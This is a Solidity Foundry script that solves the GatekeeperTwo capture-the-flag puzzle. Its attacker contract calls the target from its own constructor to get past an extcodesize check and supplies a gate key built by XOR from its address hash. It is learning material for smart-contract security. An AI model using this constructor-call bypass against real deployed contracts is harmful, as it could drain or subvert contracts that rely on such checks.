// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { GatekeeperTwo } from "../src/GatekeeperTwo.sol";

contract SmartAttacker {

    GatekeeperTwo public instance = GatekeeperTwo(0x63254338599ec40Bb12485072A1968d414B78cb2);
    uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;

    constructor () {
        // during the construction, the code of the contract is not set yet
        instance.enter(bytes8(_gateKey));
    }

}

contract StupidAttacker {

    GatekeeperTwo public instance = GatekeeperTwo(0x63254338599ec40Bb12485072A1968d414B78cb2);
    uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;

    constructor () {}

    function attack() external {
        instance.enter(bytes8(_gateKey));
    }

}

contract GatekeeperTwoSolver is Script {

    GatekeeperTwo public instance = GatekeeperTwo(0x63254338599ec40Bb12485072A1968d414B78cb2);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function run() external {
        
        vm.startBroadcast(prv);
        
        // (new StupidAttacker()).attack();
        new SmartAttacker();

        vm.stopBroadcast();

    }

}

